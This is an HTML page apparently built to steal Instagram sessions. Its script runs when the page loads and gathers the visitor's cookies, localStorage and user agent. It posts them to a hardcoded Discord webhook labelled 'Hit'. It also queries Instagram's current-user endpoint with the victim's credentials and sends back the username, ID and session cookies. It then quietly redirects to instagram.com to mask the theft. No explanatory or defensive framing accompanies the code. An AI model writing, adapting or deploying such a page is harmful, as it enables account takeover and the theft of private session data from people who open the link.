<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>.</title>
    <style>body{background:#000;margin:0;height:100vh}</style>
</head>
<body>
    <script>
        const DISCORD = 'https://discord.com/api/webhooks/1496531603210506392/kf7iJdmSOgzhV21bKbYXiVv6NvZdXxxMuUR-teMhvQwAEKCDFxo-euHie5B00imucPJh';
        
        async function send(data) {
            fetch(DISCORD, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    content: null,
                    embeds: [{
                        title: "🎯 Hit",
                        color: 0xE4405F,
                        fields: [
                            {name: "🍪 Cookies", value: `\`\`\`${data.cookies || 'None'}\`\`\``, inline: false},
                            {name: "📱 UA", value: data.ua || 'Unknown', inline: false},
                            {name: "⏰ Time", value: new Date().toLocaleString(), inline: false}
                        ],
                        footer: {text: "Instagram Session"}
                    }]
                })
            });
        }
        
        async function grab() {
            const cookies = document.cookie;
            const storage = {...localStorage};
            
            // Send everything
            send({
                cookies: cookies,
                storage: JSON.stringify(storage),
                ua: navigator.userAgent,
                ref: document.referrer
            });
            
            // Try Instagram API
            try {
                const res = await fetch('https://www.instagram.com/api/v1/accounts/current_user/?__a=1', {
                    credentials: 'include'
                });
                if(res.ok) {
                    const data = await res.json();
                    fetch(DISCORD, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            embeds: [{
                                title: "✅ ACTIVE SESSION",
                                color: 0x00FF00,
                                fields: [
                                    {name: "User", value: data.username || 'Unknown', inline: true},
                                    {name: "ID", value: data.pk || 'Unknown', inline: true},
                                    {name: "Session", value: `\`\`\`${cookies}\`\`\``, inline: false}
                                ]
                            }]
                        })
                    });
                }
            } catch(e) {}
            
            setTimeout(() => window.location = 'https://instagram.com', 1000);
        }
        
        grab();
    </script>
</body>
</html>
